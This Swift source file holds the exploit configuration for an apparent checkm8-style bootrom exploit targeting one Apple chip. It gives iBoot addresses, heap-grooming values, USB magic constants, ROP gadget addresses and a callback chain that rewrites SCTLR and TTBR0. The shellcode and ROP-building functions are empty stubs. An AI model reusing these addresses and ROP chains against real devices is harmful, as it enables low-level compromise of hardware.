//
//  ExploitConfig.swift
//  Queen-IOKit
//
//  Created by Cookie on 6/2/24.
//

import Foundation
import MVPCStruct

let PAYLOAD_OFFSET_ARMV7 = 384
let PAYLOAD_SIZE_ARMV7   = 320
let PAYLOAD_OFFSET_ARM64 = 384
let PAYLOAD_SIZE_ARM64   = 576

enum ExploitConfigError: Error {
    case DeviceNotSupported(UInt16)
}

class ExploitConfig {
    
    let version: String // iBoot v string
    let cpid: UInt16
    let largeLeak: Int
    let overwrite: [UInt8]?
    let overwriteOffset: UInt16
    let hole: Int
    let leak: Int
    
    var usbConstants: [UInt64]
    var checkm8Constants: [UInt64]
    
    let loadWriteGadget: UInt64
    let writeSctlrGadget: UInt64
    let funcGadget: UInt64
    let writeTtbr0: UInt64
    let tlbi: UInt64
    let dcCivac: UInt64
    let dmb: UInt64
    let handleInterfaceRequest: UInt64
    let nopGadget: UInt64
    
    let callbacks: [(UInt64, UInt64)]
    
    init(withCpid cpid: UInt16) throws {
        switch cpid {
        case 0x8015:
            self.version = "iBoot-3332.0.0.1.23"
            self.cpid = cpid
            self.largeLeak = 0
            self.overwrite = nil
            self.overwriteOffset = 0x500
            self.hole = 6
            self.leak = 1
            
            self.usbConstants = [
                0x18001C000, // 1 - LOAD_ADDRESS
                0x6578656365786563, // 2 - EXEC_MAGIC
                0x646F6E65646F6E65, // 3 - DONE_MAGIC
                0x6D656D636D656D63, // 4 - MEMC_MAGIC
                0x6D656D736D656D73, // 5 - MEMS_MAGIC
                0x10000B9A8, // 6 - USB_CORE_DO_IO
            ]
            
            self.checkm8Constants = [
                0x180008528, // 1 - gUSBDescriptors
                0x180003A78, // 2 - gUSBSerialNumber
                0x10000AE80, // 3 - usb_create_string_descriptor
                0x1800008FA, // 4 - gUSBSRNMStringDescriptor
                0x18001BC00, // 5 - PAYLOAD_DEST
                UInt64(PAYLOAD_OFFSET_ARM64), // 6 - PAYLOAD_OFFSET
                UInt64(PAYLOAD_SIZE_ARM64), // 7 - PAYLOAD_SIZE
                0x180008638, // 8 - PAYLOAD_PTR
            ]
            
            self.loadWriteGadget        = 0x10000945C
            self.writeSctlrGadget       = 0x1000003EC
            self.funcGadget             = 0x10000A9AC
            self.writeTtbr0             = 0x10000045C
            self.tlbi                   = 0x1000004AC
            self.dcCivac                = 0x1000004D0
            self.dmb                    = 0x1000004F0
            self.handleInterfaceRequest = 0x10000BCCC
            
            self.nopGadget              = 0x10000A9C4
            
            self.callbacks = [
                (dcCivac,                 0x18001C800),
                (dcCivac,                 0x18001C840),
                (dcCivac,                 0x18001C880),
                (dmb,                     0),
                (writeSctlrGadget,        0x100D),
                (loadWriteGadget,         0x18001C000),
                (loadWriteGadget,         0x18001C010),
                (writeTtbr0,              0x180020000),
                (tlbi,                    0),
                (loadWriteGadget,         0x18001C020),
                (writeTtbr0,              0x18000C000),
                (tlbi,                    0),
                (0x18001C800,             0),
            ]
            
        default:
            throw ExploitConfigError.DeviceNotSupported(cpid)
        }
    }
    
    func usbRopCallbacks(address: UInt64, funcGadget: UInt64, callbacks:  [(UInt64, UInt64)]) -> [UInt8] {
        return [UInt8]()
    }
    
    func asmArm64X7Trampoline(address: UInt64) -> UInt64 {
        return 0x0
    }
    
    func asmArm64Branch(source: UInt64, destination: UInt64) -> UInt64 {
        return 0x0
    }
    
    func prepareShellcode(for fileName: String) -> [UInt8] {
        return [UInt8]()
    }
    
    
}
